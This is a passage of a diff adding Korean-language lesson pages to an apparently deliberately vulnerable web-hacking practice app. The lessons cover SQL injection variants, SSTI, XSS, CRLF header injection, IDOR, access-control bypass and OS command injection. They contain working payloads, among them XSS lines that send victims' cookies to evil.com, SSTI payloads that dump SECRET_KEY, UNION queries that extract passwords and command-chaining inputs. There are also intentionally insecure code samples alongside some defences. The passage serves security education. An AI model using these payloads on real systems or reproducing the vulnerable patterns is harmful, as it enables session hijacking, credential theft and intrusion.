+                        data-bs-toggle="collapse" data-bs-target="#advC">
+                        C. Time-Based Blind SQLi (시간 지연 기반)
+                    </button>
+                </h2>
+                <div id="advC" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> SQLite의 <code>RANDOMBLOB</code> 또는 무거운 서브쿼리로 응답 지연을 유발해
+                            조건 참을 시간으로 구분합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval"
+                                    target="_blank" class="text-info">PortSwigger: Time-Based Lab</a></small>
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-danger border-opacity-25">
+                            <span class="text-danger fw-bold">Step 1:</span> 아이디에 입력 → 네트워크 탭에서 응답 시간을 관측합니다:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">admin' AND 1=(SELECT COUNT(*) FROM (SELECT 1 FROM sqlite_master m CROSS JOIN sqlite_master n) WHERE username='admin')--</code>
+                            <span class="text-danger fw-bold">Step 2:</span> SQLite에서
+                            <code>RANDOMBLOB(100000000)</code>을 조건 참일 때만 실행되게 해 응답 지연을 측정합니다.<br>
+                            <span class="text-danger fw-bold">Step 3:</span> 응답이 늦으면 = 조건 참. 이를 통해 에러도 결과도 없는 블라인드 환경에서
+                            데이터를 추출합니다.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- D: SSTI -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-success" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#advD">
+                        D. [심화] SSTI — <a href="https://portswigger.net/web-security/server-side-template-injection"
+                            target="_blank" class="text-success text-decoration-none">Server-Side Template Injection</a>
+                    </button>
+                </h2>
+                <div id="advD" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> Jinja2 템플릿 엔진에 직접 코드를 삽입해 서버 환경변수, 파일, 내부 객체를 탈취합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+                                    target="_blank" class="text-info">HackTricks SSTI Cheatsheet</a></small>
+                        </p>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-success border-opacity-25">
+                            <span class="text-success fw-bold">Step 1:</span> Postman/cURL로
+                            <code>POST /api/ssti_theme</code> JSON body: <code>{"theme": "{{ 7*7 }}"}</code><br>
+                            <span class="text-success fw-bold">Step 2:</span> 반환값이 <code>49</code>면 서버가 Python 표현식을
+                            실행했습니다! (코드 실행 확인)<br>
+                            <span class="text-success fw-bold">Step 3:</span> 고급 페이로드: <code>{{ config }}</code>,
+                            <code>{{ request.environ }}</code>로 서버 설정 전체를 노출시킵니다.
+                        </div>
+                        <code class="d-block p-3 bg-black text-success mt-3 mb-1">
+# 단계적 페이로드 심화
+{{ 7*7 }}                  → 49   (기본 실행 확인)
+{{ config }}               → Flask 앱 설정 전체 노출
+{{ config.SECRET_KEY }}    → 시크릿 키 탈취!
+{{ request.environ }}      → 서버 환경변수 전부 출력</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- E: Reflected XSS -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#advE">
+                        E. <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank"
+                            class="text-info text-decoration-none">Reflected XSS</a> (반사형 크로스 사이트 스크립팅)
+                    </button>
+                </h2>
+                <div id="advE" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> URL/쿼리 파라미터가 페이지에 그대로 렌더링될 때, 링크를 공유하는 것만으로 스크립트를
+                            실행시킵니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/cross-site-scripting/reflected"
+                                    target="_blank" class="text-info">PortSwigger: Reflected XSS</a> | <a
+                                    href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html"
+                                    target="_blank" class="text-info">OWASP XSS Prevention</a></small>
+                        </p>
+                        <div class="alert alert-dark font-monospace small border border-info border-opacity-25">
+                            <span class="text-info fw-bold">Step 1:</span> <a href="/xss" class="text-info">XSS 테스트
+                                페이지</a>로 이동하여 입력란에 주입합니다:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">&lt;script&gt;alert('Reflected XSS! 쿠키: ' + document.cookie)&lt;/script&gt;</code>
+                            <span class="text-info fw-bold">Step 2:</span> 악용 — 아래 링크를 피해자에게 공유만 해도 클릭 즉시 스크립트 실행 가능:
+                            <code
+                                class="d-block my-2 p-2 bg-black text-info">http://127.0.0.1:5000/xss?input=&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</code>
+                            <span class="text-info fw-bold">Step 3:</span> Stored XSS와 달리 DB에 저장되지 않지만, 피해자에게 URL만 전달하면
+                            신뢰 사이트에서 실행됩니다. (피싱 공격의 핵심 기법)
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- F: HTTP Response Header Injection -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-secondary" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#advF">
+                        F. [심화] <a href="https://owasp.org/www-community/attacks/HTTP_Response_Splitting"
+                            target="_blank" class="text-secondary text-decoration-none">HTTP Response Splitting / Header
+                            Injection</a>
+                    </button>
+                </h2>
+                <div id="advF" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 서버가 사용자 입력을 HTTP 응답 헤더에 반영할 때, CRLF(<code>\r\n</code>)
+                            문자를 삽입해 응답을 쪼개거나 위조합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/kb/issues/00200200_http-response-header-injection"
+                                    target="_blank" class="text-info">PortSwigger: Header Injection</a></small>
+                        </p>
+                        <div
+                            class="alert alert-dark font-monospace small mb-3 border border-secondary border-opacity-50">
+                            <span class="text-secondary fw-bold">개념 예시 코드 (취약):</span>
+                            <code class="d-block my-2 p-2 bg-black text-warning">@app.route('/redirect')
+def redir():
+    url = request.args.get('url')
+    resp = Response(status=302)
+    resp.headers['Location'] = url  # ← 입력 미검증
+    return resp</code>
+                            <span class="text-secondary fw-bold">공격 페이로드 URL:</span>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-danger">/redirect?url=http://evil.com%0d%0aSet-Cookie:%20session=hacked</code>
+                            <span class="text-secondary fw-bold">결과:</span> 브라우저는
+                            <code>Location: http://evil.com</code>과 <code>Set-Cookie: session=hacked</code> 두 개의 헤더를 수신
+                            → 세션 쿠키 강제 설정.
+                        </div>
+                        <p class="small text-secondary">방어: 입력에서 <code>%0d</code>, <code>%0a</code> (캐리지리턴/라인피드) 를 거부하거나
+                            <code>flask.redirect()</code> 같은 안전한 래퍼를 사용하세요.</p>
+                    </div>
+                </div>
+            </div>
+
+        </div><!-- /advAccordion -->
+    </div>
+</div>
+
+<!-- Advanced Pattern Modules -->
+<div class="card shadow-lg rounded-4 mb-5 mt-4 section-book">
+    <div class="card-header py-4 px-4 d-flex align-items-center gap-3">
+        <i class="bi bi-book fs-3" style="color:var(--c-yellow)"></i>
+        <div>
+            <h4 class="mb-0 fw-bold" style="color:var(--c-yellow)">웹 해킹 고급 취약 패턴</h4>
+            <small class="text-muted">UPDATE SQLi · 숫자형 IDOR · Second-Order XSS · Password 필드 SQLi · URL 접근제어 · OS CMD
+                비교</small>
+        </div>
+    </div>
+    <div class="card-body p-4 p-md-5">
+        <div class="accordion" id="bookAccordion">
+
+            <!-- G: UPDATE Query SQLi -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#bookG">
+                        G. UPDATE 쿼리 SQL Injection (회원정보 수정 취약점)
+                    </button>
+                </h2>
+                <div id="bookG" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 마이페이지 정보 수정 쿼리에 SQLi를 주입해 <strong>다른 사용자의 비밀번호를 강제
+                                변경</strong>합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts"
+                                    target="_blank" class="text-info">PortSwigger: SQLi in UPDATE</a></small>
+                        </p>
+                        <h6 class="text-warning fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// id를 폼 숨김 필드로 전달받아 쿼리에 직접 삽입
+query = "update members set name='" + name + "', email='" + email +
+        "' where id='" + id + "'";  // ← id도 미검증!</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">이 앱에서 재현:</span>
+                            <span class="text-warning fw-bold">Step 1:</span> <a href="/change_pw" class="text-info">암호
+                                변경 페이지</a> URL 파라미터로 테스트합니다.<br>
+                            <span class="text-warning fw-bold">Step 2:</span> 속임수 hidden 필드나 URL에 `id` 값을 변조:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">id=alice' WHERE username='admin'-- </code>
+                            <span class="text-warning fw-bold">Step 3:</span> UPDATE가 다른 사람의 row에 적용됩니다! WHERE 절이 주입값으로
+                            변경 되었기 때문입니다.<br>
+                            <span class="text-secondary small">💡 원리:
+                                <code>UPDATE SET col=val WHERE id='<mark>victim' WHERE user='admin'--</mark>'</code></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- H: 숫자형 IDOR (boardView idx) -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#bookH">
+                        H. 숫자형 SQLi + IDOR (게시글 idx 파라미터 변조)
+                    </button>
+                </h2>
+                <div id="bookH" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 게시글 번호(idx) 파라미터가 숫자 타입에도 불구하고 SQLi/IDOR에 취약한 패턴을
+                            분석합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/access-control/idor" target="_blank"
+                                    class="text-info">PortSwigger: IDOR</a></small>
+                        </p>
+                        <h6 class="text-warning fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">query = "select * from insecure_board where idx=" + idx;
+// idx를 따옴표 없이 그대로 삽입 → 숫자형 SQLi 가능!
+// 권한 체크 없음 → 비밀 게시글(secret='y')도 그냥 조회</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">IDOR 공격:</span> 이 앱에서는 <a href="/post/1"
+                                class="text-info">/post/1</a>, <a href="/post/2" class="text-info">/post/2</a> 처럼 숫자를 직접
+                            변경해 다른 사람 게시글을 조회할 수 있습니다.<br><br>
+                            <span class="text-warning fw-bold">숫자형 SQLi:</span> 따옴표가 없는 숫자 컨텍스트에서는 다음 페이로드를 씁니다:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-warning">GET /post/1 UNION SELECT 1,username,password,4,5 FROM users-- </code>
+                            <span class="text-secondary small">💡 문자형 vs 숫자형: <code>WHERE id='<mark>'입력'</mark>'</code>
+                                vs <code>WHERE idx=<mark>입력</mark></code> — 숫자형은 따옴표 없이 바로 연산됩니다.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- I: Second-Order XSS -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#bookI">
+                        I. Second-Order (Stored) XSS — content 필드 통한 지속 공격
+                    </button>
+                </h2>
+                <div id="bookI" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 게시글 content 필드에 XSS 페이로드를 저장하면, 다른 사람이 읽을 때마다
+                            Javascript가 실행됩니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/cross-site-scripting/stored"
+                                    target="_blank" class="text-info">PortSwigger: Stored XSS</a></small>
+                        </p>
+                        <h6 class="text-warning fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// boardAction.jsp: content를 그대로 DB에 저장 (필터 없음)
+query = "insert into insecure_board(content, ...) values('" + content + "', ...)"
+
+// boardView.jsp: &lt;%=rs.getString("content")%&gt; 로 이스케이프 없이 출력
+// → 저장된 스크립트가 열람 시 브라우저에서 실행됨</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">Step 1:</span> <a href="/post/write" class="text-info">새
+                                글 쓰기</a> → 내용에 입력:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-success">&lt;img src=x onerror="fetch('http://evil.com?c='+document.cookie)"&gt;</code>
+                            <span class="text-warning fw-bold">Step 2:</span> 저장 후 다른 사람이 해당 게시글을 열면 → 그 사람의 쿠키가 공격자에게
+                            전송됩니다.<br>
+                            <span class="text-warning fw-bold">Step 3:</span> <code>&lt;script&gt;</code> 태그가 필터링되어도
+                            <code>onerror</code>, <code>onload</code>, <code>onmouseover</code> 같은 이벤트 핸들러로 우회
+                            가능합니다.<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">&lt;svg onload=alert(1)&gt;
+&lt;body onpageshow=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- J: Password Field SQLi -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#bookJ">
+                        J. PASSWORD 필드 SQL Injection (비밀번호 입력란 공격)
+                    </button>
+                </h2>
+                <div id="bookJ" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 일반적으로 ID 필드만 테스트하지만, 비밀번호 필드도 SQLi에 취약할 수 있습니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection#sql-injection-in-different-parts-of-the-query"
+                                    target="_blank" class="text-info">PortSwigger: SQLi in Different Parts</a></small>
+                        </p>
+                        <h6 class="text-warning fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">query = "select * from members where id='" + id +
+        "' and password='" + password + "'";
+// password 파라미터도 그대로 삽입 → 양쪽 모두 SQLi 가능</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">Step 1:</span> 이 앱의 <a href="/login"
+                                class="text-info">로그인</a>에서 아이디는 아무 문자나, 비밀번호 필드에 주입:<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">임의아이디 / ' OR 1=1 -- </code>
+                            <span class="text-warning fw-bold">Step 2:</span> 실제 실행 쿼리:<br>
+                            <code
+                                class="d-block my-2 p-2 bg-black text-danger">WHERE id='임의아이디' AND password='' OR 1=1 -- '</code>
+                            <span class="text-success fw-bold">결과:</span> AND보다 OR가 나중에 평가되어 전체 조건이 참이 됩니다 → 로그인 우회
+                            성공!<br>
+                            <span class="text-secondary small">💡 보안 테스터는 모든 입력 필드를 SQLi 포인트로 의심해야 합니다. username만 테스트하는
+                                것은 불충분합니다.</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- K: URL 접근 제한 미흡 -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#bookK">
+                        K. URL 직접 접근 (인증 없는 기능 페이지 접근)
+                    </button>
+                </h2>
+                <div id="bookK" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 로그인/권한 검증이 누락된 기능 URL에 직접 접근해 인증을 우회합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" target="_blank"
+                                    class="text-info">OWASP: Broken Access Control</a> | <a
+                                    href="https://portswigger.net/web-security/access-control" target="_blank"
+                                    class="text-info">PortSwigger: Access Control</a></small>
+                        </p>
+                        <h6 class="text-warning fw-bold mt-3">📚 책의 취약 패턴 (url_example)</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// ❌ 취약한 패턴: 로그인 체크를 UI(버튼 숨기기)로만 처리
+// 실제 페이지(/admin, /mypage, /boardAction.jsp)는 URL로 직접 접근 가능
+
+// ✅ 올바른 서버사이드 체크:
+if(userId == null || "".equals(userId)) {
+    response.sendRedirect("login.jsp");  // 서버가 직접 차단
+}</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">Step 1:</span> 로그아웃 상태에서 아래 URL에 직접 접근해보세요:<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">/admin &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;← 관리자 페이지 (쿠키 변조로 접근 가능)
+/post/write &nbsp;&nbsp;← 글쓰기 (세션 없이 접근 시도)
+/download?file=../run.py  ← 인증 없이 파일 다운로드</code>
+                            <span class="text-warning fw-bold">Step 2:</span> 응답이 로그인 리다이렉션 없이 내용을 반환하면 → URL 접근제한
+                            미흡!<br>
+                            <span class="text-warning fw-bold">Step 3:</span> <a href="/admin" class="text-info">/admin
+                                직접 접근</a> → role=admin 쿠키만 변경하면 서버 인증 없이 접근됩니다.<br>
+                            <span class="text-secondary small">💡 방어: 모든 기능 엔드포인트에서 서버사이드 세션 체크 + 클라이언트 쿠키 무결성 검증(서명)
+                                필요</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- L: OS CMD (Runtime.exec 패턴) -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-warning" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#bookL">
+                        L. OS Command Injection 심화 — Java Runtime.exec vs Python os.popen
+                    </button>
+                </h2>
+                <div id="bookL" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> Java와 Python에서 OS CMD Injection이 다르게 구현되어도 공격 원리는 동일함을
+                            비교 분석합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/os-command-injection" target="_blank"
+                                    class="text-info">PortSwigger: OS Command Injection</a> | <a
+                                    href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank"
+                                    class="text-info">OWASP</a></small>
+                        </p>
+                        <h6 class="text-warning fw-bold mt-3">📚 책의 취약 코드 vs 이 앱의 코드 비교</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// Java (pingcheck.jsp) — Runtime.getRuntime().exec()
+ps = Runtime.getRuntime().exec("cmd.exe /c ping " + ip);
+// ip = "127.0.0.1 & dir" → '& dir' 부분이 cmd에서 실행됨
+
+// Python (practice.py) — os.popen()
+cmd = f"ping -n 4 {ip}"  # ip = "127.0.0.1 & dir"
+output = os.popen(cmd).read()  # 동일하게 명령어 연결 실행</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-warning border-opacity-25">
+                            <span class="text-warning fw-bold">Windows 구분자 연산자:</span><br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">127.0.0.1 & whoami      → &amp; 뒤 명령어 무조건 실행
+127.0.0.1 && whoami     → &amp;&amp; 앞 성공 시만 실행
+127.0.0.1 | whoami      → 앞 결과를 무시하고 실행
+127.0.0.1 || whoami     → 앞 실패 시만 실행</code>
+                            <span class="text-warning fw-bold">Linux 구분자:</span>
+                            <code class="d-block my-2 p-2 bg-black text-success">127.0.0.1; id           → ; 뒤 명령어 무조건 실행
+127.0.0.1 $(id)         → 명령어 치환으로 실행
+127.0.0.1 `id`          → 백틱 명령어 치환</code>
+                            <a href="/ping" class="btn btn-sm btn-outline-warning mt-2">→ 서버 진단 도구 (이 앱의 CMD Injection
+                                실습)</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div><!-- /bookAccordion -->
+    </div>
+</div>
+
+<!-- Deep Dive Extra Modules -->
+<div class="card shadow-lg rounded-4 mb-5 mt-4 section-deep">
+    <div class="card-header py-4 px-4 d-flex align-items-center gap-3">
+        <i class="bi bi-layers fs-3" style="color:var(--c-green)"></i>
+        <div>
+            <h4 class="mb-0 fw-bold" style="color:var(--c-green)">🔬 심층 분석 — 놓치기 쉬운 고급 기법</h4>
+            <small class="text-muted">DOM XSS · ORDER BY Injection · 검색 타입 주입 · MIME 우회 · Second-Order SQLi · 비밀 게시글
+                IDOR · XSS+CSRF 체인</small>
+        </div>
+    </div>
+    <div class="card-body p-4 p-md-5">
+        <div class="accordion" id="deepAccordion">
+
+            <!-- M: DOM-based XSS -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepM">
+                        M. DOM-Based XSS — 서버를 거치지 않는 클라이언트 사이드 XSS
+                    </button>
+                </h2>
+                <div id="deepM" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> <code>innerHTML</code>, <code>document.write()</code>,
+                            <code>location.hash</code> 등 JavaScript DOM API를 통해 서버 응답 없이 XSS를 실행합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/cross-site-scripting/dom-based"
+                                    target="_blank" class="text-info">PortSwigger: DOM-Based XSS</a> | <a
+                                    href="https://domxss.com/" target="_blank" class="text-info">DOM XSS
+                                    Wiki</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// 서버사이드 출력 없음 — 모두 클라이언트 JavaScript로 처리
+var keyword = (new URLSearchParams(window.location.search)).get('keyword');
+if(keyword) {
+    document.getElementById('searchResult1').innerHTML = result1;  // ← innerHTML에 직접 삽입!
+    // innerHTML은 HTML로 파싱되어 &lt;script&gt; 포함 이벤트 핸들러도 실행됨
+}</code>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">공격 방법:</span><br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">?keyword=&lt;img src=x onerror=alert(1)&gt;
+?keyword=&lt;svg onload=alert(document.cookie)&gt;
+?keyword=&lt;iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'&gt;</code>
+                            <span class="text-info fw-bold">Reflected XSS와의 차이:</span><br>
+                            <table class="table table-dark table-bordered table-sm mb-0 mt-2">
+                                <thead>
+                                    <tr>
+                                        <th>구분</th>
+                                        <th>Reflected XSS</th>
+                                        <th>DOM-Based XSS</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td>처리 위치</td>
+                                        <td>서버사이드</td>
+                                        <td>클라이언트사이드</td>
+                                    </tr>
+                                    <tr>
+                                        <td>서버 로그</td>
+                                        <td>기록됨</td>
+                                        <td>기록 안 됨 ⚠️</td>
+                                    </tr>
+                                    <tr>
+                                        <td>WAF 탐지</td>
+                                        <td>상대적으로 쉬움</td>
+                                        <td>어려움 (응답에 없음)</td>
+                                    </tr>
+                                    <tr>
+                                        <td>방어</td>
+                                        <td>서버 이스케이프</td>
+                                        <td>textContent 사용</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                        <code class="d-block p-3 bg-black text-success">// ✅ 안전한 코드: innerHTML 대신 textContent 사용
+document.getElementById('result').textContent = keyword;
+// textContent는 HTML로 파싱하지 않아 스크립트 실행 불가</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- N: ORDER BY Injection -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepN">
+                        N. ORDER BY Injection — 정렬 파라미터를 통한 데이터 추출
+                    </button>
+                </h2>
+                <div id="deepN" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 테이블 정렬 기능의 컬럼명 파라미터가 SQLi에 취약할 때, CASE WHEN 구문으로 데이터를 한
+                            글자씩 추출합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection/blind" target="_blank"
+                                    class="text-info">PortSwigger: Blind with ORDER BY</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// sort, sortColumn 파라미터를 따옴표 없이 쿼리에 직접 삽입
+query += " order by " + sortColumn + " " + sort;
+// 예: sortColumn = "idx" → "order by idx desc"
+// 주입: sortColumn = "(SELECT CASE WHEN 1=1 THEN name ELSE idx END)"</code>
+                        <div class="alert alert-dark font-monospace small mb-0 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">공격 원리:</span> ORDER BY는 따옴표가 허용되지 않는 문맥이라 일반적인 SQLi 필터를
+                            우회합니다.<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">?sortColumn=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='0' THEN name ELSE idx END)&sort=asc
+→ 결과가 name순 정렬이면 첫 글자='0' (참), idx순이면 거짓
+→ 결과 순서만으로 데이터 1비트씩 추출 가능!</code>
+                            <span class="text-info fw-bold">이 앱에서:</span> <a href="/post/list?sort=asc&sortColumn=idx"
+                                class="text-info">게시글 목록</a>의 정렬 파라미터를 브라우저 개발자도구 네트워크탭에서 조작해보세요.
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- O: searchType SQLi (Column Name Injection) -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepO">
+                        O. 검색 타입 파라미터 Injection — 컬럼명 주입으로 WHERE 절 탈출
+                    </button>
+                </h2>
+                <div id="deepO" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 게시판 검색 타입 선택(콤보박스)이 서버에서 컬럼명으로 직접 사용될 때, 이를 주입 포인트로
+                            활용합니다.<br>
+                            <small class="text-secondary"><a
+                                    href="https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts"
+                                    target="_blank" class="text-info">PortSwigger: SQLi in Different
+                                    Contexts</a></small>
+                        </p>
+                        <h6 class="text-info fw-bold mt-3">📌 취약 코드 패턴 예시</h6>
+                        <code class="d-block p-3 bg-black text-danger mb-3">// searchType을 컬럼명으로 직접 삽입
+query = "select * from insecure_board where " + searchType + " like '%" + keyword + "%'";
+
+// 예상 입력: searchType="title" → "WHERE title like '%키워드%'"
+// 공격 입력: searchType="1=1 UNION SELECT ..." → WHERE 절 탈출!</code>
+                        <div class="alert alert-dark font-monospace small mb-3 border border-info border-opacity-25">
+                            <span class="text-info fw-bold">공격 방법:</span> 콤보박스를 브라우저 개발자도구로 수정하거나 Burp Suite/curl로 직접
+                            POST:<br>
+                            <code class="d-block my-2 p-2 bg-black text-warning">searchType=1 UNION SELECT 1,username,password,4,5 FROM users-- 
+&keyword=anything</code>
+                            <span class="text-info fw-bold">핵심 교훈:</span> 클라이언트에서 <code>&lt;select&gt;</code> 콤보박스로 제한해도
+                            서버에서 다시 검증하지 않으면 공격 가능합니다.<br>
+                            <code class="d-block my-2 p-2 bg-black text-success">// ✅ 방어: 허용된 컬럼명 화이트리스트
+List&lt;String&gt; allowed = Arrays.asList("title", "name", "content");
+if(!allowed.contains(searchType)) { return error; }</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- P: MIME Type Bypass -->
+            <div class="accordion-item border-0 mb-3 shadow-sm rounded-4 overflow-hidden">
+                <h2 class="accordion-header">
+                    <button class="accordion-button collapsed fw-bold fs-5 text-info" type="button"
+                        data-bs-toggle="collapse" data-bs-target="#deepP">
+                        P. 파일 업로드 — MIME 타입 우회 (Content-Type 변조)
+                    </button>
+                </h2>
+                <div id="deepP" class="accordion-collapse collapse">
+                    <div class="accordion-body bg-body">
+                        <p class="mb-2"><strong>실습 목표:</strong> 서버가 Content-Type 헤더만으로 파일 유형을 검증할 때, Burp Suite로 헤더를
